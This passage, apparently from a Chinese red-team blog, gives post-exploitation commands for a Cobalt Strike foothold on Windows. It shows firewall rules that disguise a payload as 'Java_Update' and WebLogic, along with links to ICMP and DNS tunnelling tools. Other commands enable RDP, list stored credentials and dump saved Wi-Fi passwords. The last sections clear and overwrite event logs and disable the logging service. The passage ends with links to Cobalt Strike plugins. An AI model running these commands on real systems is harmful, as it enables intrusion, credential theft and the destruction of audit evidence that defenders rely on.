根据防⽕墙配置，⽬标主机已放⾏ TCP 7001 端⼝的⼊站流量（对应 WebLogic 服务端⼝）。我们可以利⽤这个开放端⼝进⾏ Beacon 连接 这仅表示：<br>
添加防⽕墙规则:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 放⾏7001端⼝的⼊站流量（伪装为WebLogic）</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="n">add</span> <span class="n">rule</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;WebLogic_Service&#34;</span> <span class="n">dir</span><span class="o">=</span><span class="ow">in</span> <span class="n">protocol</span><span class="o">=</span><span class="n">TCP</span> <span class="n">localport</span><span class="o">=</span><span class="mi">7001</span> <span class="n">action</span><span class="o">=</span><span class="n">allow</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 放⾏CS⽊⻢进程路径（可选）</span>
</span></span><span class="line"><span class="cl"><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="n">add</span> <span class="n">rule</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;Java_Update&#34;</span> <span class="n">dir</span><span class="o">=</span><span class="ow">in</span> <span class="n">program</span><span class="o">=</span><span class="s2">&#34;C:\Windows\Temp\payload.exe&#34;</span> <span class="n">action</span><span class="o">=</span><span class="n">allow</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>利⽤ ICMP 协议</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/krabelize/icmpdoor
</span></span></code></pre></td></tr></table>
</div>
</div><p>DNS隧道</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/iagox86/dnscat2
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="0x12-rdp操作相关">0x12 RDP操作相关</h1>
<h2 id="查看rdp端">查看RDP端⼝</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell reg query &#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /v PortNumber
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722133525.png" alt="image.png"><br>
为16进制数0xd3d，转换为10进制就是3389</p>
<h2 id="开放rdp服务">开放RDP服务</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell reg add &#34;HKLM\SYSTEM\CurrentControlSet\control\Terminal Server&#34; /v fDenyTSConnections /d 0 /t REG_DWORD /f
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722133644.png" alt="image.png"></p>
<h2 id="开放rdp端">开放RDP端⼝</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell netsh advfirewall firewall add rule name=&#34;Remote Desktop&#34; protocol=TCP dir=in localport=3389 action=allow
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722133732.png" alt="image.png"></p>
<h2 id="离线破解rdp连接密码">离线破解RDP连接密码</h2>
<p>查看是否存在凭证：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722133858.png" alt="image.png"></p>
<h2 id="获取wifi密码">获取WiFi密码</h2>
<p>查看连接过的Wifi名称：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netsh wlan show profiles
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722134654.png" alt="image.png"><br>
如果乱码可以下载下来看</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell netsh wlan show profiles &gt; wlan.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看指定Wifi的密码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netsh wlan show profile name=&#34;WIFI名称&#34; key=clear
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722134819.png" alt="image.png"></p>
<h2 id="查看代理">查看代理</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell reg query &#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722135014.png" alt="image.png"></p>
<h1 id="0x13-志痕迹相关">0x13 ⽇志痕迹相关</h1>
<h2 id="清除事件志">清除事件⽇志</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wevtutil cl &#34;Windows PowerShell&#34;
</span></span><span class="line"><span class="cl">wevtutil cl &#34;Security&#34;
</span></span><span class="line"><span class="cl">wevtutil cl &#34;System&#34;
</span></span><span class="line"><span class="cl">wevtutil cl &#34;Application&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Security：登录/特权操作记录
</span></span><span class="line"><span class="cl">Windows PowerShell：PS执⾏历史
</span></span><span class="line"><span class="cl">System：系统服务/驱动事件
</span></span><span class="line"><span class="cl">Application：应⽤程序事件
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="停志相关服务">停⽌⽇志相关服务</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">阻⽌新⽇志⽣成  
</span></span><span class="line"><span class="cl">禁⽤事件转发功能
</span></span><span class="line"><span class="cl">中断⽇志记录链
</span></span><span class="line"><span class="cl">sc stop Schedule
</span></span><span class="line"><span class="cl">sc stop wecsvc
</span></span><span class="line"><span class="cl">sc stop eventlog
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722135228.png" alt="image.png"></p>
<h2 id="永久禁志服务">永久禁⽤⽇志服务</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sc config EventLog start= disabled
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="志件覆盖">⽇志⽂件覆盖</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 物理覆盖⽇志⽂件
</span></span><span class="line"><span class="cl">cipher /w:C:\Windows\System32\winevt\Logs\Security.evtx
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">使⽤cipher⼯具进⾏3次覆盖写⼊
</span></span><span class="line"><span class="cl">防⽌⽂件恢复⼯具提取⽇志
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="0x13-cs插件">0x13 CS插件</h1>
<h4 id="ola">OLa</h4>
<p>下载地址：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/d3ckx1/OLa/tree/main
</span></span></code></pre></td></tr></table>
</div>
</div><p>cs2插件，直接可以在cs2中使用：<br>
<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250717212946.png" alt="image.png"></p>
<h4 id="taowu">taowu</h4>
<p>下载地址：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/Mr-xn/taowu-cobalt-strike
</span></span></code></pre></td></tr></table>
</div>
</div><p>cs2插件<br>
<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250717213252.png" alt="image.png"></p>
<h4 id="lstar---aggressor">LSTAR - Aggressor</h4>
<p>下载地址：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/lintstar/LSTAR/
</span></span></code></pre></td></tr></table>
</div>
</div><p>cs插件<br>
<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250717213634.png" alt="image.png"></p>

</section>


    <footer class="article-footer">
    

    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">相关文章</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/cve-2025-32463linux-sudo-chroot-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/">
        
        
            <div class="article-image">
                
                    <img src="/images/91.webp" loading="lazy" data-key="" data-hash="/images/91.webp"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">【CVE-2025-32463】Linux sudo chroot 本地提权</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86enscan_go-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/">
        
        
            <div class="article-image">
                
                    <img src="/images/82.webp" loading="lazy" data-key="" data-hash="/images/82.webp"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">【资产收集】ENScan_Go-信息收集工具</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/icmp%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86ew-pingtunnel%E7%BB%84%E5%90%88%E5%BB%BA%E7%AB%8Bscoks5%E9%9A%A7%E9%81%93/">
        
        
            <div class="article-image">
                
                    <img src="/images/62.webp" loading="lazy" data-key="" data-hash="/images/62.webp"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">【ICMP协议隧道代理】ew&#43;pingtunnel组合建立scoks5隧道</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/socks-5%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86spp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">
        
        
            <div class="article-image">
                
                    <img src="/images/60.webp" loading="lazy" data-key="" data-hash="/images/60.webp"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">【socks 5反向代理】spp内网穿透工具的使用</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B/">
        
        
            <div class="article-image">
                
                    <img src="/images/58.webp" loading="lazy" data-key="" data-hash="/images/58.webp"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">【内网攻防】内网扫描探测</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

    
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2024 - 
        
        2025 Slimer
    </section>
        
    <section class="runtime" style="margin-top:8px;font-size:1.3rem">
        <span id="site-runtime">站点已运行计算中...</span>
    </section>
    <script>
      (function(){
        var sinceStr = '2025-08-25T00:00:00'.replace('T',' ').replace('t',' ');
        var start = new Date(sinceStr);
        function update(){
          var now = new Date();
          var diff = Math.max(0, now - start);
          var days = Math.floor(diff / (24*60*60*1000));
          var hours = Math.floor((diff % (24*60*60*1000)) / (60*60*1000));
          var mins = Math.floor((diff % (60*60*1000)) / (60*1000));
          var secs = Math.floor((diff % (60*1000)) / 1000);
          var el = document.getElementById('site-runtime');
          if(el){ el.textContent = '站点已运行 ' + days + ' 天 ' + hours + ' 小时 ' + mins + ' 分 ' + secs + ' 秒'; }
        }
        update();
        setInterval(update, 1000);
      })();
    </script>
    
	
    <section class="powerby">
        
        
        
    </section>
</footer>




    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.310d38c99963e86c53c43232d9b04e101a98b09425c2fb12195e655db9e34368.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>
 <style>
    body {
      background: url(http://localhost:1313/background/bz.webp) no-repeat center top;
      background-size: cover;
      background-attachment: fixed;
      backdrop-filter: blur(50px);
      -webkit-backdrop-filter: blur(50px);  
    }
  </style>

<style>
  @font-face {
    font-family: 'youyuan';
    src: url(http://localhost:1313/font/youyuan.woff2) format('truetype');
  }

  :root {
    --base-font-family: 'youyuan';
    --code-font-family: 'youyuan';
  }
</style>

<script src=http://localhost:1313/background/sakura.js></script>


    </body>
</html>
